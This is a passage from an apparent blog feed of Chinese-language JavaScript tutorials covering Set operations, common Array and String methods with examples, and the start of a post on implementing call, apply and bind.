title="并集交集差集"></a>并集交集差集</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">//并集</span></span><br><span class="line"><span class="keyword">let</span> union = <span class="keyword">new</span> <span class="built_in">Set</span>([...a,...b])</span><br><span class="line"></span><br><span class="line"><span class="comment">//交集</span></span><br><span class="line"><span class="keyword">let</span> intersect = <span class="keyword">new</span> <span class="built_in">Set</span>([...a].filter(<span class="function"><span class="params">item</span> =&gt;</span> b.has(item)))</span><br><span class="line"></span><br><span class="line"><span class="comment">//差集</span></span><br><span class="line"><span class="keyword">let</span> difference = <span class="keyword">new</span> <span class="built_in">Set</span>([...a].filter(<span class="function"><span class="params">item</span> =&gt;</span> !b.has(item)))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Map&quot;&gt;&lt;a href=&quot;#Map&quot; class=&quot;headerlink&quot; title=&quot;Map&quot;&gt;&lt;/a&gt;Map&lt;/h1&gt;&lt;h2 id=&quot;含义和基本用法&quot;&gt;&lt;a href=&quot;#含义和基本用法&quot; class=&quot;headerlink&quot; title=&quot;含义和基本用法&quot;&gt;&lt;/a&gt;含义和基本用法&lt;/h2&gt;&lt;p&gt;它类似于对象，也是键值对的集合。但是键的范围不限于字符串，各种类型的值都可以当做键，提供了”值-值”的对应，如果需要键值对的数据结构Map比Object更合适&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ES6" scheme="https://gzzzzh.github.io/tags/ES6/"/>
    
      <category term="JavaSrript" scheme="https://gzzzzh.github.io/tags/JavaSrript/"/>
    
  </entry>
  
  <entry>
    <title>常用字符串数组方法</title>
    <link href="https://gzzzzh.github.io/2019/04/25/%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95/"/>
    <id>https://gzzzzh.github.io/2019/04/25/常用字符串数组方法/</id>
    <published>2019-04-25T06:00:39.000Z</published>
    <updated>2019-04-25T06:04:07.943Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h1><h2 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h2><p>concat()方法用于连接两个或者多个数组，不会改变现有数组，返回一个被连接数组的副本<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">let</span> arr2 =[<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.prototype.concat(arr1,arr2)); <span class="comment">//[1,2,3,4,5]</span></span><br></pre></td></tr></table></figure></p><a id="more"></a><h2 id="join"><a href="#join" class="headerlink" title="join"></a>join</h2><p>join()方法把数组中所有元素放进一个字符串中，通过设置参数可以设置用什么分隔符进行分割，不设置的话默认用’,’ 此方法不会改变原来数组<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr1.join(<span class="string">','</span>)); <span class="comment">//1,2,3</span></span><br></pre></td></tr></table></figure></p><h2 id="pop-push-shift-unshift"><a href="#pop-push-shift-unshift" class="headerlink" title="pop,push,shift,unshift"></a>pop,push,shift,unshift</h2><ol><li>pop()删除并且返回数组最后一个元素</li><li>push()往数组末尾添加一个或者多个元素，返回新数组的长度</li><li>shift()删除并且返回数组第一个元素</li><li>unshift()往数组开头添加一个或者多个元素，返回新数组的长度<br>以上方法都会改变原来数组</li></ol><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p>reverse()用于颠倒数组中元素的顺序，会改变原来数组，返回排序后的数组<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr1.reverse()); <span class="comment">//[3,2,1]</span></span><br></pre></td></tr></table></figure></p><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p>sort()对数组的元素进行排序，会改变原来数组，返回排序后的数组。可以通过参数传递一个比较回调函数进行排序。这个函数要有两个参数a,b</p><ol><li>对于升序来说，若a &lt; b ,应该返回一个负数，此时a应在b的前面</li><li>a = b 应该返回0</li><li>a &gt; b，应该返回一个正数，此时a应在b后面<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr3 = [<span class="number">1</span>,<span class="number">65</span>,<span class="number">120</span>,<span class="number">29</span>,<span class="number">27</span>,<span class="number">9856</span>,<span class="number">2111</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr3.sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b <span class="comment">//[ 1, 27, 29, 65, 120, 2111, 9856 ]</span></span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></li></ol><h2 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h2><p>slice()可以从数组中返回选定元素，这方法不会修改原数组，而是返回一个新的子数组，包含从 start 到 end （不包括该元素）的 arrayObject 中的元素。其中start可以是负数，-1代表最后一个，如此类推<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr1.slice(<span class="number">1</span>,<span class="number">5</span>)); <span class="comment">//[2,3,8,9]</span></span><br></pre></td></tr></table></figure></p><h2 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h2><p>splice()可以往数组插入，删除，替换，返回的是被删除项目的新数组(如果有删除的话)，会改变原来数组</p><ol><li>index，必须，整数，规定了添加或者删除的开始位置，可以是负数，-1是代表最后一个，如此类推</li><li>howmany，必须，要删除的项目，如果设置为0则不会删除项目</li><li>item… 可选，向数组添加的新项目<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3>只需要指定两个参数，要删除第一项的位置和删除的个数<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr1.splice(<span class="number">0</span>,<span class="number">2</span>)); <span class="comment">//[1,2]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1);  <span class="comment">//[3,8,9,10]</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>提供三个参数，起始位置，0(要删除的个数),要插入的项。插入是在起始位置的前面开始插入<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr1.splice(<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>)); <span class="comment">//[] 因为没有删除项</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">//[ 4, 5, 1, 2, 3, 8, 9, 10 ]</span></span><br></pre></td></tr></table></figure></p><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p>提供三个参数，起始位置，删除个数，要插入的项。在删除的位置开始插入<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr1.splice(<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>)); <span class="comment">//[2,3]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">//[ 1, 4, 5, 8, 9, 10 ]</span></span><br></pre></td></tr></table></figure></p><h2 id="isArray"><a href="#isArray" class="headerlink" title="isArray"></a>isArray</h2><p>最终确定某个对象是不是数组，不管他在哪个全局环境下执行,返回true或者false</p><h2 id="indexOf，lastIndexOf"><a href="#indexOf，lastIndexOf" class="headerlink" title="indexOf，lastIndexOf"></a>indexOf，lastIndexOf</h2><p>两个方法都接受两个参数，要查找的项和查找起点的索引(可选，默认从头开始或者最后开始)，会返回查找项在数组中的位置，如果没有就会返回-1。在比较的时候内部使用的是全等操作符<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr1.indexOf(<span class="number">100</span>));</span><br><span class="line"><span class="built_in">console</span>.log(arr1.lastIndexOf(<span class="number">3</span>));</span><br></pre></td></tr></table></figure></p><h2 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h2><p>对数组每一项运行给定的函数，该方法没有返回值。参数默认是function，函数默认有参数，分别是遍历的数组内容，索引，数组本身<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="keyword">let</span> arr2 =[<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">arr1.forEach(<span class="function">(<span class="params">item,index,arr</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;index&#125;</span>---<span class="subst">$&#123;item&#125;</span>---<span class="subst">$&#123;arr&#125;</span>`</span>);<span class="comment">/*0---1---1,2,3,8,9,10</span></span><br><span class="line"><span class="comment">                                                1---2---1,2,3,8,9,10</span></span><br><span class="line"><span class="comment">                                                2---3---1,2,3,8,9,10</span></span><br><span class="line"><span class="comment">                                                3---8---1,2,3,8,9,10</span></span><br><span class="line"><span class="comment">                                                4---9---1,2,3,8,9,10</span></span><br><span class="line"><span class="comment">                                                5---10---1,2,3,8,9,10*/</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h2 id="every"><a href="#every" class="headerlink" title="every"></a>every</h2><p>判断数组每一项是不是满足某个条件，满足条件的会返回一个true，如果全都满足方法最后会返回true，否则为false<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr1.every(<span class="function">(<span class="params">item,index,arr</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item &gt; <span class="number">0</span> <span class="comment">//true</span></span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></p><h2 id="some"><a href="#some" class="headerlink" title="some"></a>some</h2><p>判断数组其中一项是否满足某个条件，如果有一个满足返回true的就会马上停止遍历，方法最后返回true，否则为false</p><h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><p>对数组每一项运行函数，返回一个数组，这个数组里面每一项都是在运行函数里返回true的项，顾名思义过滤,对查询符合某些条件的所有数组项非常有用<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr1.filter(<span class="function">(<span class="params">item,index,arr</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item  &lt;= <span class="number">3</span> <span class="comment">//[1,2,3]</span></span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></p><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><p>map指映射，对数组每一项运行函数，返回每次函数调用结果形成的数组。意思是返回一个数组，这个数组每一项都是原数组每一项通过函数运行结果传入来的。不会改变原来数组<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr1.map(<span class="function">(<span class="params">item,index,arr</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item + <span class="number">1</span> <span class="comment">//[ 2, 3, 4, 9, 10, 11 ]</span></span><br><span class="line">&#125;));</span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">// [ 1, 2, 3, 8, 9, 10 ]</span></span><br></pre></td></tr></table></figure></p><h2 id="reduce，reduceRight"><a href="#reduce，reduceRight" class="headerlink" title="reduce，reduceRight"></a>reduce，reduceRight</h2><p>这两个方法会迭代数组所有项，构建一个最终返回的值。其中reduce方法是从第一项开始，reduceRight是从最后一项开始往前去</p><ol><li>在每一项都调用的函数，这函数有4个参数，这函数返回值都会当做第一个参数传给下一项<ol><li>前一个值</li><li>当前值</li><li>项的索引</li><li>数组对象</li></ol></li><li>可选，作为归并开始的初始值，也就是第一次迭代的时候作为prev传递进去的参数<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr1.reduce(<span class="function">(<span class="params">prev,cur,index,arr</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> prev + cur <span class="comment">// 22</span></span><br><span class="line">&#125;,<span class="number">1</span>));</span><br></pre></td></tr></table></figure></li></ol><h2 id="Array-form"><a href="#Array-form" class="headerlink" title="Array.form"></a>Array.form</h2><p>可以将伪数组或者可遍历对象转换成真实数组</p><ol><li>input，必须，要转换的类似数组对象和可遍历对象</li><li>function，类似于数组的map方法，用来对每个元素进行处理，将处理后的值放入返回的数组</li><li>content,绑定2中用到的this</li></ol><h2 id="Array-of"><a href="#Array-of" class="headerlink" title="Array.of"></a>Array.of</h2><p>可以将一组值转为数组，用来弥补Array()构造函数的不足，总是返回参数值组成的数组。如果没有参数，就返回一个空数组。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.of()); <span class="comment">//[]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.of(<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>],<span class="number">4</span>,<span class="number">5</span>,&#123;<span class="attr">name</span>:<span class="string">'tom'</span>&#125;)); <span class="comment">//[ 1, [ 2, 3 ], 4, 5, &#123; name: 'tom' &#125; ]</span></span><br></pre></td></tr></table></figure></p><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>可以找到第一个符合条件的项，返回这个项，没有符合的返回undefined，不会改变原来数组<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr1.find(<span class="function">(<span class="params">item,index,arr</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item &gt; <span class="number">5</span> <span class="comment">// 6</span></span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></p><h2 id="findIndex"><a href="#findIndex" class="headerlink" title="findIndex"></a>findIndex</h2><p>效果同上，不过返回的是符合条件的项的索引，没有符合的返回-1<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="built_in">console</span>.log(arr1.findIndex(<span class="function">(<span class="params">item,index,arr</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item &gt; <span class="number">7</span> <span class="comment">// -1</span></span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></p><h1 id="String"><a href="#String" class="headerlink" title="String"></a>String</h1><h2 id="charAt"><a href="#charAt" class="headerlink" title="charAt"></a>charAt</h2><p>charAt()方法返回指定位置的字符,和str[index]使用类似，但他索引超过范围的是返回空字符串，而str[index]返回的是undefined</p><h2 id="concat-1"><a href="#concat-1" class="headerlink" title="concat"></a>concat</h2><p>和Array的concat很相似，用来连接字符串,通常使用+号直接相连更方便</p><h2 id="indexOf-lastIndexOf"><a href="#indexOf-lastIndexOf" class="headerlink" title="indexOf,lastIndexOf"></a>indexOf,lastIndexOf</h2><p>可以返回某个指定的字符串值在字符串中首次出现的位置，如果找不到就返回-1，大小写敏感<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">'Hello World！'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(str.indexOf(<span class="string">'world'</span>)); <span class="comment">// -1</span></span><br><span class="line"><span class="built_in">console</span>.log(str.indexOf(<span class="string">'World'</span>)); <span class="comment">// 6</span></span><br></pre></td></tr></table></figure></p><h2 id="match"><a href="#match" class="headerlink" title="match"></a>match</h2><p>match() 方法可在字符串内检索指定的值，或找到一个或多个正则表达式的匹配。该方法类似 indexOf() 和 lastIndexOf()，但是它返回指定的值，而不是字符串的位置。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">'Hello 1World！'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(str.match(<span class="string">'world'</span>)); <span class="comment">//null</span></span><br><span class="line"><span class="built_in">console</span>.log(str.match(<span class="string">'World'</span>)); <span class="comment">//[ 'World', index: 7, input: 'Hello 1World！', groups: undefined ]</span></span><br><span class="line"><span class="built_in">console</span>.log(str.match(<span class="regexp">/\d+/g</span>)); <span class="comment">//[ '1' ]</span></span><br></pre></td></tr></table></figure></p><h2 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h2><p>replace()方法用于在字符串中用一些字符替换另一些字符，或者替换与正则表达式匹配的字串，返回一个新的字符串</p><ol><li>regexp/substr，必须，规定要被替换的字符串</li><li>replacement，必须，一个字符串，用来替换<ol><li>$1 … $99 与 regexp 中的第 1 到第 99 个子表达式相匹配的文本。</li><li>$&amp; 与regexp 相匹配的子串。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> text = <span class="string">"javascript Tutorial"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(text.replace(<span class="regexp">/javascript/i</span>, <span class="string">"JavaScript"</span>)) <span class="comment">//JavaScript Tutorial</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><p>search() 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串。返回是一个匹配的字串的起始位置，如果没有找到则返回-1。会自动忽略全局匹配<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> text = <span class="string">"javascript Tutorial javascript"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(text.search(<span class="regexp">/JavaScript/i</span>)); <span class="comment">// 0</span></span><br></pre></td></tr></table></figure></p><h2 id="slice-1"><a href="#slice-1" class="headerlink" title="slice"></a>slice</h2><p>slice() 方法可提取字符串的某个部分，并以新的字符串返回被提取的部分，不会改变原来字符串,与Array.slice类似，比substring灵活一些</p><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><p>split() 方法用于把一个字符串分割成字符串数组。返回一个切割后字符串数组，不包括separator</p><ol><li>separator,必须，字符串或者正则表达式，从该参数开始分割</li><li>howmany，指定返回最大长度，没有设置的话整个字符串都会分割<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = <span class="string">'|2|3|'</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1.split(<span class="string">'|'</span>));<span class="comment">//[ '', '2', '3', '' ]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr1 = <span class="string">'This is a book'</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1.split(<span class="regexp">/\s+/</span>)); <span class="comment">//[ 'This', 'is', 'a', 'book' ]</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="sub-sup"><a href="#sub-sup" class="headerlink" title="sub,sup"></a>sub,sup</h2><p>将字符串显示为下标/上标</p><h2 id="includes"><a href="#includes" class="headerlink" title="includes"></a>includes</h2><p>判断是否包含指定字符串,找到一个符合的就会返回true<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = <span class="string">'This is a book'</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1.includes(<span class="string">' a '</span>));</span><br></pre></td></tr></table></figure></p><h2 id="startsWith，endsWith"><a href="#startsWith，endsWith" class="headerlink" title="startsWith，endsWith"></a>startsWith，endsWith</h2><p>判断是否以指定的字符串开头或者结尾</p><h2 id="repeat"><a href="#repeat" class="headerlink" title="repeat"></a>repeat</h2><p>重复指定字符串次数,返回一个新字符串，不会改变原来的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = <span class="string">'a'</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1.repeat(<span class="number">5</span>)); <span class="comment">//aaaaa</span></span><br><span class="line"><span class="built_in">console</span>.log(arr1); <span class="comment">// a</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Array&quot;&gt;&lt;a href=&quot;#Array&quot; class=&quot;headerlink&quot; title=&quot;Array&quot;&gt;&lt;/a&gt;Array&lt;/h1&gt;&lt;h2 id=&quot;concat&quot;&gt;&lt;a href=&quot;#concat&quot; class=&quot;headerlink&quot; title=&quot;concat&quot;&gt;&lt;/a&gt;concat&lt;/h2&gt;&lt;p&gt;concat()方法用于连接两个或者多个数组，不会改变现有数组，返回一个被连接数组的副本&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; arr1 = [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; arr2 =[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.concat(arr1,arr2)); &lt;span class=&quot;comment&quot;&gt;//[1,2,3,4,5]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="JavaScript" scheme="https://gzzzzh.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>手写call，apply和bind</title>
    <link href="https://gzzzzh.github.io/2019/04/07/%E6%89%8B%E5%86%99call%EF%BC%8Capply%E5%92%8Cbind/"/>
    <id>https://gzzzzh.github.io/2019/04/07/手写call，apply和bind/</id>
    <published>2019-04-07T13:58:33.000Z</published>
    <updated>2019-04-07T15:17:30.853Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前略"><a href="#前略" class="headerlink" title="前略"></a>前略</h2><p>在JavaScript的权威指南上写着，call(),apply()可以看做是某个对象的方法，通过调用方法的形式来间接调用函数。bind()是将某个函数绑定到某个对象上</p><p>也就是说，可以理解成可以使一个对象使用不属于他本身的方法，让函数在指定的对象下执行，能够改变this的指向，改变函数的执行上下文<br><a id="more"></a></p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><ol><li><p>call和apply的用法一致，效果一样，唯一不同的就是参数。他们第一个参数都是指定的对象，剩下参数为给函数传递的参数，call是用逗号进行分隔，而apply是都放在一个数组里面。<br><img src="/2019/04/07/手写call，apply和bind/1.png" alt></p></li><li><p>bind是使对象绑定这个方法，也就是说和call，apply直接执行不一样，他只是返回一个函数，要调用返回函数才能获得结果。bind第一个参数也是指定对象，剩下参数可以在任意地方添加<br><img src="/2019/04/07/手写call，apply和bind/2.png" alt></p></li><li><p>注意，bind调用得到的函数，还可以当做构造函数使用，然后有一条原型链，构造函数原型的<strong>proto</strong>指向了调用bind这个函数的原型，意味着构造函数实例也能拥有这个函数的属性和方法</p></li></ol><h2 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h2><h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 